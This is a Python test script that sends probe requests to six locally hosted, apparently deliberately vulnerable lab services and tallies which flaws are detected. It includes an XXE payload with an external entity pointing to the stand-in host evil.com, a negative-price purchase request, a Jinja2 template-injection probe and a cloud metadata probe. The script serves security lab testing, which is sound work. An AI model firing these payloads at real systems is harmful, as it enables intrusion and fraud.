#!/usr/bin/env python3
"""Comprehensive test of new labs - test API endpoints directly"""

import requests
import json
import os
from typing import Dict, List, Any

MCP_SERVER_URL = os.environ.get("MCP_SERVER_URL", "http://localhost:8000")

# Expected findings from lab metadata
EXPECTED_FINDINGS = {
    "xxe_lab": {
        "port": 5005,
        "count": 6,
        "endpoints": {
            "/parse": "POST",
            "/api/xml": "POST"
        }
    },
    "business_logic_lab": {
        "port": 5006,
        "count": 6,
        "endpoints": {
            "/api/purchase": "POST",
            "/api/rate-limit": "GET"
        }
    },
    "cloud_lab": {
        "port": 5007,
        "count": 7,
        "endpoints": {
            "/latest/meta-data/": "GET",
            "/s3/bucket": "GET"
        }
    },
    "template_injection_lab": {
        "port": 5008,
        "count": 3,
        "endpoints": {
            "/api/render": "POST"
        }
    },
    "deserialization_lab": {
        "port": 5009,
        "count": 3,
        "endpoints": {
            "/api/deserialize": "POST"
        }
    },
    "graphql_lab": {
        "port": 5010,
        "count": 4,
        "endpoints": {
            "/graphql": "POST"
        }
    }
}

def test_xxe_api(target_port: int):
    """Test XXE via API endpoint"""
    print(f"\n[XXE] Testing API endpoint on port {target_port}...")
    try:
        # XXE payload
        xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://evil.com/xxe">
]>
<foo>&xxe;</foo>"""
        
        resp = requests.post(
            f"http://localhost:{target_port}/api/xml",
            data=xxe_payload,
            headers={"Content-Type": "application/xml"},
            timeout=10
        )
        
        if resp.status_code in (200, 400, 500):  # Any response means endpoint works
            # Check if XXE was processed (would show in response or error)
            if "evil.com" in resp.text or "xxe" in resp.text.lower():
                print(f"  ✓ XXE vulnerability detected")
                return True
            else:
                print(f"  ⚠ Endpoint accessible but XXE not confirmed in response")
                return False
        else:
            print(f"  ✗ Unexpected status: {resp.status_code}")
            return False
    except Exception as e:
        print(f"  ✗ Exception: {e}")
        return False

def test_business_logic_api(target_port: int):
    """Test business logic via API"""
    print(f"\n[Business Logic] Testing API endpoint on port {target_port}...")
    try:
        # Try price manipulation
        payload = {"item_id": "1", "price": -100, "quantity": 1}
        resp = requests.post(
            f"http://localhost:{target_port}/api/purchase",
            json=payload,
            timeout=10
        )
        
        if resp.status_code == 200:
            data = resp.json()
            if data.get("success") and data.get("total") is not None:
                total = data.get("total", 0)
                if total < 0 or total == 0:
                    print(f"  ✓ Price manipulation detected (total: {total})")
                    return True
                else:
                    print(f"  ⚠ Endpoint works but price validation may be present")
                    return False
        else:
            print(f"  ✗ Status: {resp.status_code}")
            return False
    except Exception as e:
        print(f"  ✗ Exception: {e}")
        return False

def test_cloud_metadata(target_port: int):
    """Test cloud metadata endpoints"""
    print(f"\n[Cloud] Testing metadata endpoints on port {target_port}...")
    try:
        # Test AWS metadata
        resp = requests.get(
            f"http://localhost:{target_port}/latest/meta-data/",
            timeout=10
        )
        
        if resp.status_code == 200:
            content = resp.text.lower()
            if "ami-id" in content or "instance-id" in content:
                print(f"  ✓ AWS metadata endpoint accessible")
                return True
            else:
                print(f"  ⚠ Endpoint accessible but metadata format unexpected")
                return False
        else:
            print(f"  ✗ Status: {resp.status_code}")
            return False
    except Exception as e:
        print(f"  ✗ Exception: {e}")
        return False

def test_graphql_introspection(target_port: int):
    """Test GraphQL introspection"""
    print(f"\n[GraphQL] Testing introspection on port {target_port}...")
    try:
        query = """
        query {
          __schema {
            queryType {
              name
            }
          }
        }
        """
        resp = requests.post(
            f"http://localhost:{target_port}/graphql",
            json={"query": query},
            timeout=10
        )
        
        if resp.status_code == 200:
            data = resp.json()
            if data.get("data") and data["data"].get("__schema"):
                print(f"  ✓ GraphQL introspection enabled")
                return True
            else:
                print(f"  ⚠ GraphQL works but introspection disabled")
                return False
        else:
            print(f"  ✗ Status: {resp.status_code}")
            return False
    except Exception as e:
        print(f"  ✗ Exception: {e}")
        return False

def test_template_injection(target_port: int):
    """Test template injection"""
    print(f"\n[Template Injection] Testing on port {target_port}...")
    try:
        # Jinja2 SSTI payload
        payload = {"template": "{{7*7}}", "context": {}}
        resp = requests.post(
            f"http://localhost:{target_port}/api/render",
            json=payload,
            timeout=10
        )
        
        if resp.status_code == 200:
            data = resp.json()
            rendered = data.get("rendered", "")
            if "49" in rendered:
                print(f"  ✓ Template injection detected (expression evaluated)")
                return True
            else:
                print(f"  ⚠ Endpoint works but template not evaluated")
                return False
        else:
            print(f"  ✗ Status: {resp.status_code}")
            return False
    except Exception as e:
        print(f"  ✗ Exception: {e}")
        return False

def test_deserialization(target_port: int):
    """Test deserialization"""
    print(f"\n[Deserialization] Testing on port {target_port}...")
    try:
        # Test YAML deserialization
        yaml_payload = "name: test\nvalue: 123"
        payload = {"format": "yaml", "data": yaml_payload}
        resp = requests.post(
            f"http://localhost:{target_port}/api/deserialize",
            json=payload,
            timeout=10
        )
        
        if resp.status_code == 200:
            data = resp.json()
            if data.get("success"):
                print(f"  ✓ Deserialization endpoint accessible")
                return True
            else:
                print(f"  ⚠ Endpoint works but deserialization may be safe")
                return False
        else:
            print(f"  ✗ Status: {resp.status_code}")
            return False
    except Exception as e:
        print(f"  ✗ Exception: {e}")
        return False

def main():
    print("=" * 70)
    print("Comprehensive Vulnerability Lab Testing")
    print("=" * 70)
    
    results = {}
    total_expected = sum(lab["count"] for lab in EXPECTED_FINDINGS.values())
    
    # Test each lab
    results["xxe"] = test_xxe_api(5005)
    results["business_logic"] = test_business_logic_api(5006)
    results["cloud"] = test_cloud_metadata(5007)
    results["template_injection"] = test_template_injection(5008)
    results["deserialization"] = test_deserialization(5009)
    results["graphql"] = test_graphql_introspection(5010)
    
    # Summary
    print("\n" + "=" * 70)
    print("Test Summary")
    print("=" * 70)
    
    detected = sum(1 for v in results.values() if v)
    total_tests = len(results)
    
    print(f"Total expected findings across all labs: {total_expected}")
    print(f"Tests run: {total_tests}")
    print(f"Vulnerabilities detected: {detected}")
    print(f"Detection rate: {detected}/{total_tests} ({detected*100//total_tests if total_tests > 0 else 0}%)")
    
    print("\nDetailed results:")
    for lab, detected in results.items():
        status = "✓" if detected else "✗"
        print(f"  {status} {lab}: {'Detected' if detected else 'Not detected'}")
    
    # Save results
    output = {
        "total_expected": total_expected,
        "tests_run": total_tests,
        "detected": detected,
        "detection_rate": f"{detected}/{total_tests}",
        "results": results
    }
    
    with open("/tmp/lab_test_results.json", "w") as f:
        json.dump(output, f, indent=2)
    print(f"\nResults saved to /tmp/lab_test_results.json")

if __name__ == "__main__":
    main()

